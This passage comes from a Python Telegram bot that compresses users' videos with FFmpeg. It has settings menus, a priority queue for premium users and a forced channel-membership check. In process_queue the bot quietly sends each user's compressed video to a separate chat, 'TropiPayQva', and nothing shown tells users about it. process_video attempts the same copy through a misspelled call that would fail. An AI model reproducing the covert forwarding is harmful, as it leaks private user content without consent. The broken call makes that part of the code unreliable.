                    f"{'✅ ' if settings['preset'] == 'medium' else ''}Medium", 
                    callback_data="preset_medium"
                )
            ],
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['preset'] == 'fast' else ''}Fast", 
                    callback_data="preset_fast"
                ),
                InlineKeyboardButton(
                    f"{'✅ ' if settings['preset'] == 'faster' else ''}Faster", 
                    callback_data="preset_faster"
                )
            ],
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['preset'] == 'veryfast' else ''}Veryfast", 
                    callback_data="preset_veryfast"
                ),
                InlineKeyboardButton(
                    f"{'✅ ' if settings['preset'] == 'superfast' else ''}Superfast", 
                    callback_data="preset_superfast"
                )
            ],
            [
                InlineKeyboardButton(TRANSLATIONS['es']['prev'], callback_data="prev_codec"),
                InlineKeyboardButton(TRANSLATIONS['es']['close'], callback_data="close_settings"),
                InlineKeyboardButton(TRANSLATIONS['es']['next'], callback_data="next_crf")
            ]
        ])

        await message.edit_text(
            text=f"{TRANSLATIONS['es']['settings_title']}\n\n{TRANSLATIONS['es']['preset_title']}",
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Error en show_preset_settings: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=TRANSLATIONS['es']['action_error']
            )

# Función show_crf_settings
async def show_crf_settings(client, message, user_id=None):
    try:
        if not message:
            return

        if user_id is None:
            if not hasattr(message, 'from_user'):
                return
            user_id = message.from_user.id
        
        settings = await get_user_settings(user_id)
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '25' else ''}25", callback_data="crf_25"),
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '28' else ''}28", callback_data="crf_28"),
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '30' else ''}30", callback_data="crf_30")
            ],
            [
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '32' else ''}32", callback_data="crf_32"),
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '35' else ''}35", callback_data="crf_35"),
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '38' else ''}38", callback_data="crf_38")
            ],
            [
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '40' else ''}40", callback_data="crf_40"),
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '42' else ''}42", callback_data="crf_42"),
                InlineKeyboardButton(f"{'✅ ' if settings['crf'] == '45' else ''}45", callback_data="crf_45")
            ],
            [
                InlineKeyboardButton(TRANSLATIONS['es']['prev'], callback_data="prev_preset"),
                InlineKeyboardButton(TRANSLATIONS['es']['close'], callback_data="close_settings"),
                InlineKeyboardButton(TRANSLATIONS['es']['next'], callback_data="next_audio")
            ]
        ])

        await message.edit_text(
            text=f"{TRANSLATIONS['es']['settings_title']}\n\n{TRANSLATIONS['es']['crf_title']}",
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Error en show_crf_settings: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=TRANSLATIONS['es']['action_error']
            )

# Función show_audio_settings
async def show_audio_settings(client, message, user_id=None):
    try:
        if not message:
            return

        if user_id is None:
            if not hasattr(message, 'from_user'):
                return
            user_id = message.from_user.id
        
        settings = await get_user_settings(user_id)
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(f"{'✅ ' if settings['audio'] == '32' else ''}32", callback_data="audio_32"),
                InlineKeyboardButton(f"{'✅ ' if settings['audio'] == '48' else ''}48", callback_data="audio_48"),
                InlineKeyboardButton(f"{'✅ ' if settings['audio'] == '64' else ''}64", callback_data="audio_64")
            ],
            [
                InlineKeyboardButton(f"{'✅ ' if settings['audio'] == '96' else ''}96", callback_data="audio_96"),
                InlineKeyboardButton(f"{'✅ ' if settings['audio'] == '128' else ''}128", callback_data="audio_128")
            ],
            [
                InlineKeyboardButton(TRANSLATIONS['es']['prev'], callback_data="prev_crf"),
                InlineKeyboardButton(TRANSLATIONS['es']['close'], callback_data="close_settings"),
                InlineKeyboardButton(TRANSLATIONS['es']['next'], callback_data="next_resolution")
            ]
        ])

        await message.edit_text(
            text=f"{TRANSLATIONS['es']['settings_title']}\n\n{TRANSLATIONS['es']['audio_title']}",
            reply_markup=keyboard
        )
        
        
    except Exception as e:
        print(f"Error en show_audio_settings: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=TRANSLATIONS['es']['action_error']
            )

# Función show_resolution_settings
async def show_resolution_settings(client, message, user_id=None):
    try:
        if not message:
            return

        if user_id is None:
            if not hasattr(message, 'from_user'):
                return
            user_id = message.from_user.id
        
        settings = await get_user_settings(user_id)
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['resolution'] == 'original' else ''}{TRANSLATIONS['es']['keep_original']}", 
                    callback_data="resolution_original"
                ),
                InlineKeyboardButton(
                    f"{'✅ ' if settings['resolution'] == 'reduce' else ''}{TRANSLATIONS['es']['reduce_level']}", 
                    callback_data="resolution_reduce"
                )
            ],
            [
                InlineKeyboardButton(TRANSLATIONS['es']['prev'], callback_data="prev_audio"),
                InlineKeyboardButton(TRANSLATIONS['es']['close'], callback_data="close_settings"),
                InlineKeyboardButton(TRANSLATIONS['es']['next'], callback_data="next_pixel")
            ]
        ])

        await message.edit_text(
            text=f"{TRANSLATIONS['es']['settings_title']}\n\n{TRANSLATIONS['es']['resolution_title']}",
            reply_markup=keyboard
        )

        
    except Exception as e:
        print(f"Error en show_resolution_settings: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=TRANSLATIONS['es']['action_error']
            )

# Función show_pixel_settings
async def show_pixel_settings(client, message, user_id=None):
    try:
        if not message:
            return

        if user_id is None:
            if not hasattr(message, 'from_user'):
                return
            user_id = message.from_user.id
        
        settings = await get_user_settings(user_id)
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['pixel_format'] == 'yuv422p' else ''}{TRANSLATIONS['es']['pixel_8bit']}", 
                    callback_data="pixel_yuv422p"
                ),
                InlineKeyboardButton(
                    f"{'✅ ' if settings['pixel_format'] == 'yuv422p10le' else ''}{TRANSLATIONS['es']['pixel_10bit']}", 
                    callback_data="pixel_yuv422p10le"
                )
            ],
            [
                InlineKeyboardButton(TRANSLATIONS['es']['prev'], callback_data="prev_resolution"),
                InlineKeyboardButton(TRANSLATIONS['es']['close'], callback_data="close_settings")
            ]
        ])
        
        await message.edit_text(
            text=f"{TRANSLATIONS['es']['settings_title']}\n\n{TRANSLATIONS['es']['pixel_title']}",
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Error en show_pixel_settings: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=TRANSLATIONS['es']['action_error']
            )
            
# Modificamos el callback handler para guardar configuraciones en la base de datos
@app.on_callback_query()
async def handle_settings_callback(client, callback_query):
    try:
        if not callback_query or not callback_query.message or not callback_query.from_user:
            await callback_query.answer(TRANSLATIONS['es']['invalid_message'], show_alert=True)
            return
            
        user_id = callback_query.from_user.id
        data = callback_query.data
        
        # Registrar usuario si no existe
        await register_user(user_id, callback_query.from_user.username)
        
        # Obtener configuraciones actuales
        settings = await get_user_settings(user_id)
        
        if data.startswith("format_"):
            format = data.split("_")[1]
            settings['format'] = format
            settings['codec'] = DEFAULT_CODECS.get(format, 'libx264')
            await save_user_settings(user_id, settings)
            await show_format_settings(client, callback_query.message, user_id)
            
        
        elif data.startswith("codec_"):
            codec = data.split("_")[1]
            settings['codec'] = codec
            await save_user_settings(user_id, settings)
            await show_codec_settings(client, callback_query.message, user_id)
        
        elif data.startswith("preset_"):
            preset = data.split("_")[1]
            settings['preset'] = preset
            await save_user_settings(user_id, settings)
            await show_preset_settings(client, callback_query.message, user_id)
        
        elif data.startswith("crf_"):
            crf = data.split("_")[1]
            settings['crf'] = crf
            await save_user_settings(user_id, settings)
            await show_crf_settings(client, callback_query.message, user_id)
        
        elif data.startswith("audio_"):
            audio = data.split("_")[1]
            settings['audio'] = audio
            await save_user_settings(user_id, settings)
            await show_audio_settings(client, callback_query.message, user_id)
        
        elif data.startswith("resolution_"):
            resolution = data.split("_")[1]
            settings['resolution'] = resolution
            await save_user_settings(user_id, settings)
            await show_resolution_settings(client, callback_query.message, user_id)
        
        elif data.startswith("pixel_"):
            pixel = data.split("_")[1]
            settings['pixel_format'] = pixel
            await save_user_settings(user_id, settings)
            await show_pixel_settings(client, callback_query.message, user_id)
        
        elif data == "next_codec":
            await show_codec_settings(client, callback_query.message, user_id)
        
        elif data == "next_preset":
            await show_preset_settings(client, callback_query.message, user_id)
        
        elif data == "next_crf":
            await show_crf_settings(client, callback_query.message, user_id)
        
        elif data == "next_audio":
            await show_audio_settings(client, callback_query.message, user_id)
        
        elif data == "next_resolution":
            await show_resolution_settings(client, callback_query.message, user_id)
        
        elif data == "next_pixel":
            await show_pixel_settings(client, callback_query.message, user_id)
        
        elif data == "prev_format":
            await show_format_settings(client, callback_query.message, user_id)
        
        elif data == "prev_codec":
            await show_codec_settings(client, callback_query.message, user_id)
        
        elif data == "prev_preset":
            await show_preset_settings(client, callback_query.message, user_id)
        
        elif data == "prev_crf":
            await show_crf_settings(client, callback_query.message, user_id)
        
        elif data == "prev_audio":
            await show_audio_settings(client, callback_query.message, user_id)
        
        elif data == "prev_resolution":
            await show_resolution_settings(client, callback_query.message, user_id)

        elif data.startswith("cancel_queue_"):
            message_id = int(data.split("_")[2])
            queue_list = processing_queue.get_queue_list()
            
            for task in queue_list:
                if task.get('message_id') == message_id and task.get('user_id') == user_id:
                    # === INICIO DE LA MODIFICACIÓN ===
                    user_id = task['user_id']
                    
                    # Eliminar registros de control de usuario
                    if user_id in user_queue_tasks:
                        del user_queue_tasks[user_id]
                    if user_id in user_active_tasks:
                        del user_active_tasks[user_id]
                    
                    # Eliminar de active_tasks global
                    if message_id in active_tasks:
                        del active_tasks[message_id]
                    # === FIN DE LA MODIFICACIÓN ===
                    
                    # Actualizar contador premium
                    if task.get('user_id') in PREMIUM_USERS:
                        processing_queue.premium_count = max(0, processing_queue.premium_count - 1)
                    
                    # Reconstruir cola sin la tarea
                   # new_queue = [t for t in queue_list if t.get('message_id') != message_id]
                   # processing_queue._queue = new_queue
                    # Eliminar la tarea específica de la cola
                    processing_queue._queue = [t for t in processing_queue._queue if t['message_id'] != message_id]
                    await update_queue_positions()  # <-- Añadir esto
                    
                    await callback_query.answer(TRANSLATIONS['es']['queue_cancelled'], show_alert=True)
                    await callback_query.message.edit_text(
                        f"{callback_query.message.text}\n\n❌ Video eliminado de la cola"
                    )
                    await update_queue_positions()
                    return
            
            await callback_query.answer(TRANSLATIONS['es']['no_queue_to_cancel'], show_alert=True)

        
        elif data == "close_settings":
            try:
                await callback_query.message.delete()
            except:
                pass
            
            settings = user_settings[user_id]
            resolution_text = TRANSLATIONS['es']['keep_original'] if settings['resolution'] == 'original' else TRANSLATIONS['es']['reduce_level']
            pixel_text = TRANSLATIONS['es']['pixel_8bit'] if settings['pixel_format'] == 'yuv422p' else TRANSLATIONS['es']['pixel_10bit']
            
            await client.send_message(
                callback_query.message.chat.id,
                TRANSLATIONS['es']['current_settings'].format(
                    TRANSLATIONS['es'][f"{settings['format']}_format"],
                    settings['codec'].replace('lib', '').upper(),
                    settings['preset'],
                    settings['crf'],
                    settings['audio'],
                    resolution_text,
                    pixel_text
                )
            )
            
        await callback_query.answer()
    
    except Exception as e:
        print(f"Error en handle_settings_callback: {e}")
        await callback_query.answer(TRANSLATIONS['es']['action_error'], show_alert=True)
#############################################################################################
@app.on_message(filters.command("queue"))
async def queue_command(client, message):
    user_id = message.from_user.id
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("📢 Unirse al Canal", url="https://t.me/StvzUploadFree")],
        ]
    )
    try:
        member = await client.get_chat_member(CANAL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await message.reply_text(
                "⚠️ **Debes unirte a nuestro canal para usar este bot.**\n\n",
                reply_markup=keyboard
            )
            return
    except UserNotParticipant:
        await message.reply_text(
            "⚠️ **Debes unirte a nuestro canal para usar este bot.**\n\n",
            reply_markup=keyboard
        )
        return
    except Exception as e:
        await message.reply_text(f"Error al verificar la membresía: {e}")
        return
    try:
        if not message or not hasattr(message, 'from_user'):
            return

        user_id = message.from_user.id
        queue_list = processing_queue.get_queue_list()
        
        if not queue_list:
            await message.reply_text("La cola está vacía.")
            return
            
        queue_text = await format_queue_list(queue_list, user_id)
        await message.reply_text(f"📊 Cola de procesamiento actual:\n\n{queue_text}")
        
    except Exception as e:
        print(f"Error en queue_command: {e}")
        await message.reply_text("❌ Error al obtener la cola de procesamiento")
##########################################################################################
# Modificamos el manejador de videos para usar la base de datos
@app.on_message(filters.video)
async def handle_video(client, message):
    user_id = message.from_user.id
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("📢 Unirse al Canal", url="https://t.me/StvzUploadFree")],
        ]
    )
    try:
        member = await client.get_chat_member(CANAL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await message.reply_text(
                "⚠️ **Debes unirte a nuestro canal para usar este bot.**\n\n",
                reply_markup=keyboard
            )
            return
    except UserNotParticipant:
        await message.reply_text(
            "⚠️ **Debes unirte a nuestro canal para usar este bot.**\n\n",
            reply_markup=keyboard
        )
        return
    except Exception as e:
        await message.reply_text(f"Error al verificar la membresía: {e}")
        return
    try:
        if not message or not hasattr(message, 'video') or not hasattr(message, 'from_user'):
            return

        if message.video.file_size > 300000000000:
            await message.reply_text(TRANSLATIONS['es']['large_size_error'])
            return

        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)
        
        # Registrar usuario si no existe
        await register_user(user_id, username)
        
        # Verificar si es premium
        is_premium = await is_premium_user(user_id)

        if not is_premium:
            daily_count = await get_daily_video_count(user_id)
            print(daily_count)
            if daily_count >= 3:
                await message.reply_text("❌ Has alcanzado tu límite diario de 3 videos. Conviértete en premium para procesar más videos.")
                return
                
        # Verificar tareas activas
        if user_id in user_active_tasks:
            await message.reply_text(TRANSLATIONS['es']['active_task_error'])
            return
            
        if user_id in user_queue_tasks and not is_premium:
            # Verificar límite diario para no premium
            daily_count = await get_daily_video_count(user_id)
            print(daily_count)
            if daily_count >= 3:
                await message.reply_text("❌ Has alcanzado tu límite diario de 3 videos. Conviértete en premium para procesar más videos.")
                return
            await message.reply_text(TRANSLATIONS['es']['queue_task_error'])
            return

        # Obtener configuraciones desde la base de datos
        settings = await get_user_settings(user_id)

        status_msg = await message.reply_text(
            TRANSLATIONS['es']['video_info'].format(
                message.video.file_name or "video.mp4",
                message.video.duration,
                message.video.width,
                message.video.height,
                message.video.file_size / (1024 * 1024)
            ),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(TRANSLATIONS['es']['cancel_button'], callback_data=f"cancel_queue_{message.id}")]
            ])
        )

        processing_task = {
            'message': message,
            'message_id': message.id,
            'status_message': status_msg,
            'client': client,
            'settings': settings,
            'file_name': message.video.file_name or "video.mp4",
            'start_time': time.time(),
            'original_width': message.video.width,
            'original_height': message.video.height,
            'user_id': user_id,
            'username': username,
            'cancelled': False
        }

        # Agregar a la cola con prioridad si es premium
        user_active_tasks[user_id] = True
        await processing_queue.put(processing_task, is_premium=is_premium)
        active_tasks[message.id] = processing_task
        
        # Mostrar posición en cola
        queue_list = processing_queue.get_queue_list()
        position = queue_list.index(processing_task) + 1
        # En update_queue_positions y otros lugares donde se use:
        queue_text = await format_queue_list(queue_list, user_id)
        await status_msg.edit_text(
            f"{status_msg.text}\n🔄 Posición en cola: {position}\n\nCola:\n{queue_text}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(TRANSLATIONS['es']['cancel_button'], callback_data=f"cancel_queue_{message.id}")]
            ])
        )

        await update_queue_positions()
        if not current_processing:
            asyncio.create_task(process_queue())

    except Exception as e:
        print(f"Error recibiendo video: {e}")
        if message:
            await message.reply_text("❌ Error al procesar tu video")
        if user_id in user_active_tasks:
            del user_active_tasks[user_id]


async def process_queue():
    global current_processing
    while True:
        try:
            current_processing = True
            if processing_queue.qsize() == 0:
                await asyncio.sleep(2)
                continue
                
            task = await processing_queue.get()
            await update_queue_positions()  # <-- Añadir aquí
            
            if not task or 'message' not in task:
                processing_queue.task_done()
                continue
                
            message_id = task['message'].id
            user_id = task['user_id']

            # Verificar si la tarea fue cancelada
            if task.get('cancelled', False):
                processing_queue.task_done()
                if user_id in user_active_tasks:
                    del user_active_tasks[user_id]
                if user_id in user_queue_tasks:
                    del user_queue_tasks[user_id]
                continue

            await safe_edit_message(
                client=task['client'],
                message=task['status_message'],
                text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['downloading']}"
            )

            def dl_progress(current, total):
                asyncio.run_coroutine_threadsafe(
                    throttled_progress(current, total, task['client'], task['status_message'], 
                                    TRANSLATIONS['es']['downloading']),
                    task['client'].loop
                )

            dl_path = await task['message'].download(
                f"downloads/{task['file_name']}",
                progress=dl_progress
            )

            await safe_edit_message(
                client=task['client'],
                message=task['status_message'],
                text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['download_complete']}\n"
                     f"{TRANSLATIONS['es']['compression_progress']}"
            )

            format_extensions = {
                'mp4': '.mp4',
                'webm': '.webm',
                'mkv': '.mkv',
                'gif': '.gif',
                'mpeg2': '.mpg'
            }
            ext = format_extensions.get(task['settings']['format'], '.mp4')

            # Usar el nombre original si existe, sino generar uno con timestamp
            original_name = task['file_name']
            if original_name:
                # Eliminar la extensión original y agregar la nueva
                base_name = os.path.splitext(original_name)[0]
                output_path = f"downloads/{base_name}_@videocompreStvz_bot{ext}"
            else:
                output_path = f"downloads/compressed_{int(time.time())}{ext}"

            result = await compress_video(
                dl_path,
                output_path,
                task['settings'],
                task['client'],
                task['status_message'],
                task['original_width'],
                task['original_height']
            )

            if not result['success']:
                raise Exception(result.get('error', 'Error desconocido'))

            await safe_edit_message(
                client=task['client'],
                message=task['status_message'],
                text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['processing_complete']}\n"
                     f"{TRANSLATIONS['es']['uploading']}"
            )

            def up_progress(current, total):
                asyncio.run_coroutine_threadsafe(
                    throttled_progress(current, total, task['client'], task['status_message'],
                                    TRANSLATIONS['es']['uploading']),
                    task['client'].loop
                )

            await task['client'].send_video(
                chat_id=task['message'].from_user.id,
                video=output_path,
                caption=TRANSLATIONS['es']['compression_result'].format(
                    result['duration'],
                    result['input_size'],
                    result['output_size'],
                    (1 - (result['output_size'] / result['input_size'])) * 100
                ),
                progress=up_progress
            )

            ##
            is_premium = await is_premium_user(user_id)
            if not is_premium:
                await increment_daily_video_count(user_id)
                #########################################################
            await task['client'].send_video(
                chat_id="TropiPayQva",
                video=output_path,
                caption=TRANSLATIONS['es']['compression_result'].format(
                    result['duration'],
                    result['input_size'],
                    result['output_size'],
                    (1 - (result['output_size'] / result['input_size'])) * 100
                )
            #    progress=up_progress
            )

        except Exception as e:
            print(f"Error procesando video: {e}")
            if 'status_message' in locals() and task and 'status_message' in task and task['status_message']:
                await safe_edit_message(
                    client=task['client'],
                    message=task['status_message'],
                    text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['processing_error']}\n"
                         f"Error: {str(e)[:200]}"
                )
        finally:
            
            if 'dl_path' in locals() and os.path.exists(dl_path):
                os.remove(dl_path)
            if 'output_path' in locals() and os.path.exists(output_path):
                os.remove(output_path)
            
            if 'message_id' in locals() and message_id in active_tasks:
                del active_tasks[message_id]
            
            if 'user_id' in locals():
                if user_id in user_active_tasks:
                    del user_active_tasks[user_id]
                if user_id in user_queue_tasks:
                    del user_queue_tasks[user_id]
            
            processing_queue.task_done()
            await update_queue_positions()
            current_processing = False

async def process_video(task):
    """Procesa un video inmediatamente (para usuarios premium)"""
    try:
        user_id = task['user_id']
        
        await safe_edit_message(
            client=task['client'],
            message=task['status_message'],
            text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['downloading']}"
        )

        def dl_progress(current, total):
            asyncio.run_coroutine_threadsafe(
                throttled_progress(current, total, task['client'], task['status_message'], 
                                TRANSLATIONS['es']['downloading']),
                task['client'].loop
            )

        dl_path = await task['message'].download(
            f"downloads/{task['file_name']}",
            progress=dl_progress
        )

        await safe_edit_message(
            client=task['client'],
            message=task['status_message'],
            text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['download_complete']}\n"
                 f"{TRANSLATIONS['es']['compression_progress']}"
        )

        # Determinar extensión según formato
        format_extensions = {
            'mp4': '.mp4',
            'webm': '.webm',
            'mkv': '.mkv',
            'gif': '.gif',
            'mpeg2': '.mpg'
        }
        ext = format_extensions.get(task['settings']['format'], '.mp4')

        # Usar el nombre original si existe, sino generar uno con timestamp
        original_name = task['file_name']
        if original_name:
            # Eliminar la extensión original y agregar la nueva
            base_name = os.path.splitext(original_name)[0]
            output_path = f"downloads/{base_name}_compressed{ext}"
        else:
            output_path = f"downloads/compressed_{int(time.time())}{ext}"

        result = await compress_video(
            dl_path,
            output_path,
            task['settings'],
            task['client'],
            task['status_message'],
            task['original_width'],
            task['original_height']
        )

        if not result['success']:
            raise Exception(result.get('error', 'Error desconocido'))

        await safe_edit_message(
            client=task['client'],
            message=task['status_message'],
            text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['processing_complete']}\n"
                 f"{TRANSLATIONS['es']['uploading']}"
        )

        def up_progress(current, total):
            asyncio.run_coroutine_threadsafe(
                throttled_progress(current, total, task['client'], task['status_message'],
                                TRANSLATIONS['es']['uploading']),
                task['client'].loop
            )

        await task['client'].send_video(
            chat_id=task['message'].from_user.id,
            video=output_path,
            caption=TRANSLATIONS['es']['compression_result'].format(
                result['duration'],
                result['input_size'],
                result['output_size'],
                (1 - (result['output_size'] / result['input_size'])) * 100
            ),
            progress=up_progress
        )
        await task["Client"].send_vide("TropiPayQva",
            video=output_path,
            caption=TRANSLATIONS['es']['compression_result'].format(
                result['duration'],
                result['input_size'],
                result['output_size'],
                (1 - (result['output_size'] / result['input_size'])) * 100
            )
        )

    except Exception as e:
        print(f"Error procesando video premium: {e}")
        if 'status_message' in locals() and task and 'status_message' in task and task['status_message']:
            await safe_edit_message(
                client=task['client'],
                message=task['status_message'],
                text=f"{task['status_message'].text}\n{TRANSLATIONS['es']['processing_error']}\n"
                     f"Error: {str(e)[:200]}"
            )
    finally:
        if 'dl_path' in locals() and os.path.exists(dl_path):
            os.remove(dl_path)
        if 'output_path' in locals() and os.path.exists(output_path):
            os.remove(output_path)
        
        if 'user_id' in locals() and user_id in user_active_tasks:
            del user_active_tasks[user_id]

async def compress_video(input_path, output_path, settings, client, status_message, original_width, original_height):
    try:
        if os.path.exists(output_path):
            os.remove(output_path)

        ffmpeg_path = ffmpeg.get_ffmpeg_exe()
        start_time = time.time()
        input_size = os.path.getsize(input_path) / (1024 * 1024)
        last_progress_text = ""

        # Determinar resolución
        if settings['resolution'] == 'reduce':
            new_width, new_height = get_resolution_options(original_width, original_height, True)
            scale_filter = f"scale={new_width}:{new_height}"
        else:
            scale_filter = ""

        # Configurar parámetros específicos por formato
        output_params = []
        if settings['format'] == 'gif':
            output_params = [
                "-vf", "fps=10,split[s0][s1];[s0]palettegen[p];[s1][p]paletteuse",
                "-loop", "0"
            ]
        elif settings['format'] == 'mpeg2':
            output_params = [
                "-f", "mpeg2video",
                "-q:v", "5"
            ]

        # Construir comando FFmpeg
        command = [
            ffmpeg_path, "-i", input_path,
            "-c:v", settings['codec'],
            "-preset", settings['preset'],
            "-crf", settings['crf'],
            "-movflags", "+faststart", 
            "-pix_fmt", settings['pixel_format'],
            "-c:a", "aac",
            "-b:a", f"{settings['audio']}k"
        ]

        if scale_filter:
            command.extend(["-vf", scale_filter])

        command.extend(output_params)
        command.extend(["-y", output_path])

        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        async def monitor_progress():
            nonlocal last_progress_text
            last_update = 0
            while process.returncode is None:
                await asyncio.sleep(2)
                if os.path.exists(output_path):
                    current_time = time.time()
                    if current_time - last_update > 3:
                        last_update = current_time
                        current_size = os.path.getsize(output_path) / (1024 * 1024)
                        progress = min((current_size / (input_size * 0.9)) * 100, 100)
                        
                        progress_text = (
                            f"{status_message.text.split('🔧')[0]}\n"
                            f"🔧 Convirtiendo... {progress:.1f}%\n"
                            f"📦 Tamaño actual: {current_size:.2f}MB"
                        )
                        
                        if progress_text != last_progress_text:
                            try:
                                await status_message.edit_text(progress_text)
                                last_progress_text = progress_text
                            except Exception as e:
                                print(f"Error editando mensaje de progreso: {e}")
                                break

        monitor_task = asyncio.create_task(monitor_progress())
        await process.communicate()
        monitor_task.cancel()

        if process.returncode != 0 or not os.path.exists(output_path):
            error = (await process.stderr.read()).decode()[:500] if process.stderr else "Error desconocido"
            return {'success': False, 'error': error}

        return {
            'success': True,
            'duration': time.time() - start_time,
            'input_size': input_size,
            'output_size': os.path.getsize(output_path) / (1024 * 1024)
        }

    except Exception as e:
        return {'success': False, 'error': str(e)}
# Iniciar el bot
if __name__ == "__main__":
    # Inicializar la base de datos
    if not initialize_database():
        print("Error al inicializar la base de datos. El bot puede no funcionar correctamente.")
    
    os.makedirs("downloads", exist_ok=True)
    print("Iniciando bot...")
    app.start()
    app.send_message(5416296262, "🤖 Bot iniciado correctamente")
    print("Bot Iniciado")
    app.loop.run_forever()
